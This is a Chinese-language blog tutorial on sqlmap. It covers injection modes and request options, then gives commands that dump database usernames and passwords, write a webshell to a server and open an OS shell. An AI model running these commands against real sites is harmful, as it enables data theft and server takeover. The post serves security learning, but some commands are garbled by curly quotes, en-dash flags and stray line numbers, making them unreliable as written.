---
uuid: 83d08501-c32a-91f1-c027-76e13bbadf12
title: sqlmap教程
date: 2022-04-28 11:33:44
tags: sqlmap
categories: 
     - [sqlmap]
     - [Web]
---

**之前使用sqlmap这个工具一直都没有系统的学习，有些功能没有了解到，在这里系统的学习一下一些命令作用，方便后续使用！**

<!--more-->

## 1 介绍

[SQLMap](https://so.csdn.net/so/search?q=SQLMap&spm=1001.2101.3001.7020)是一个开放源码的测试工具，它可以自动探测和利用SQL注入漏洞来接管数据库服务器。
**具体功能：**

```bash
1、判断可注入的参数
2、判断可以用那种SQL注入技术来注入
3、识别出哪种数据库
4、根据用户选择，读取哪些数据
5、可执行情况
6、当前数据库用户名称和拥有的权限
7、发现WEB虚拟目录
8、上传***getshell
9、绕过防火墙
```

**sqlmap支持的注入模式**

```bash
1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
4、联合查询注入，可以使用union的情况下的注入。（适合用于通过循环直接输出联合查询结果，否则只会显示第一项结果）
5、堆查询注入，可以同时执行多条语句的执行时的注入。
12345
```

## 2 安装下载

### 2.1 kali自带sqlmap

可直接使用！
![在这里插入图片描述](https://img-blog.csdnimg.cn/a630573151d84159a6c3adaa8c515632.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAI2NkIH4=,size_20,color_FFFFFF,t_70,g_se,x_16)

### 2.2 下载地址:

[sqlmap](https://github.com/sqlmapproject/sqlmap)
![在这里插入图片描述](https://img-blog.csdnimg.cn/b791703586f3491bbc06886101a5ad6d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAI2NkIH4=,size_20,color_FFFFFF,t_70,g_se,x_16)

## 3 常用请求参数

### 3.1 get方法

**对于get的请求，比较简单，直接指定目标**

```bash
-d： 直接连接数据库 （-d "mysql://user:passward@地址:端口/数据库名称"）
-u：指定url  （?id=1）
-m：将多个url保存成文件，传给sqlmap （sqlmap -m list.txt）
-r：将http头信息保存到文件，交给sqlmap
-g：google搜索出来的结果 （-g "inurl:\".php?id=1\""）\"只是将双引号内的"特殊字符进行转义
-p ：只想检查的变量
-f ：指纹
--users：数据库帐号
--banner：数据库信息

--dbs：有哪些数据库
-a：all
123456789101112
```

**get请求应该是大家所熟悉的，sqlmap - u直接加URL，参数就可以了。**

### 3.2 POST方法

下面介绍几种对于post请求的sqlmap注入。
**1.使用http请求文件**
可以用burpsuite抓包并复制到txt文件

```bash
sqlmap -r  1 .txt
```

**2.使用burpsuite log文件 （勾选上options中的Misc中的proxy）**

```bash
sqlmap  - l log.txt
```

**3.HTTPS**
sqlmap同时也支持https的sql注入，只需加入参数-force-ssl告诉sqlmap这是https服务即可。
如

```bash
sqlmap -u https://192.168.1.1/a.php?id=1" -force-ssl  (默认不是443，在后加其端口)
```

**3.–date**

```bash
sqlmap -u http://127.0.0.1/sqli-labs-master/Less-11/ --data="uname=1111&passwd=11111&submit=Submit" --dbs
```

"uname=1111&passwd=11111&submit=Submit"为请求参数

## 4 常用方法

### 4.1 检测注入

#### 4.1.1基本格式

```bash
sqlmap -u “http://www.vuln.cn/post.php?id=1”
```

默认使用level1检测全部数据库类型

```bash
sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3
```

指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）

#### 4.1.2 cookie注入

当程序有防get注入的时候，可以使用cookie注入

```bash
sqlmap -u “http://www.baidu.com/shownews.asp” –cookie “id=11” –level 2（只有level达到2才会检测cookie）
```

#### 4.1.3 从post数据包中注入

可以使用burpsuite或者temperdata等工具来抓取post包

```bash
sqlmap -r “c:\tools\request.txt” -p “username” –dbms mysql    指定username参数
```

### 4.2 注入成功后

#### 4.2.1 获取数据库基本信息

```bash
sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbs
```

查询有哪些数据库

```bash
sqlmap -u URL --current-db --batch 
```

获取当前数据库

```bash
sqlmap -u “http://www.vuln.cn/post.php?id=1”  -D test –tables
```

查询test数据库中有哪些表

```bash
sqlmap -u “http://www.vuln.cn/post.php?id=1” -D test -T admin –columns
```

查询test数据库中admin表有哪些字段

~~~bash
```bash
sqlmap -u “http://www.vuln.cn/post.php?id=1” -D test -T admin -C “username,password” –dump
~~~

dump出字段username与password中的数据

**其他命令参考下面**
**从数据库中搜索字段**

```bash
sqlmap -r “c:\tools\request.txt” –dbms mysql -D dedecms –search -C admin,password
```

在dedecms数据库中搜索字段admin或者password。

**读取与写入文件**
首先找需要网站的物理路径，其次需要有可写或可读权限。

```bash
–file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）
–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）
–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
```

> \#示例：
> sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “e:\php\htdocs\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php”
>
> 使用shell命令：
> sqlmap -r “c:\tools\request.txt” -p id –dms mysql –os-shell
> 接下来指定网站可写目录：
> “E:\php\htdocs\dvwa”

**#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）**

转自：

https://blog.csdn.net/WEARE001/article/details/122024378
